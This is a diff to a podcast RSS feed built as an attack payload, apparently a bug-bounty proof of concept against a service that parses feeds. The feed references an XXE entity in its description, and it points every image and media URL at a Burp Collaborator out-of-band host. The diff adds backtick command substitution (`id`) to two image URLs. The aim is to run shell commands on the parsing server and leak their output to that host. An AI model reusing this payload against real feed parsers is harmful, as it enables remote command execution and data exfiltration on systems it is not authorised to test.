@@ -7,7 +7,7 @@
        <link>https://thefacebook.com/podcast</link>
        <description>&xxe;</description>>
        <language>en</language>
-       <itunes:image href="https://j8sbomtvbj1kfksnujp0xtwmyd45su.burpcollaborator.net/podcast/image.png"/>
+       <itunes:image href="https://j8sbomtvbj1kfksnujp0xtwmyd45su.burpcollaborator.net/podcast/image.png?`id`"/>
        <itunes:explicit>true</itunes:explicit>
        <itunes:owner>
        <itunes:email>ajdumanhug@gmail.com</itunes:email>
@@ -16,7 +16,7 @@
          <title>A Legend Is Born</title>
          <description>How to code 10x faster with 10x more bugs</description>
          <enclosure url="https://j8sbomtvbj1kfksnujp0xtwmyd45su.burpcollaborator.net/podcast/episode1.mp3" length="12345" type="audio/mpeg"/>
-         <itunes:image href="https://j8sbomtvbj1kfksnujp0xtwmyd45su.burpcollaborator.net/podcast/episode1.png" />
+         <itunes:image href="https://j8sbomtvbj1kfksnujp0xtwmyd45su.burpcollaborator.net/podcast/episode1.png?`id`" />
          <pubDate>Fri, 06 Apr 1984 00:00:01 GMT</pubDate>
          <guid>684CFFCD-CFA0-FACE-B00C-2F5473246A72</guid>
          <itunes:explicit>true</itunes:explicit>
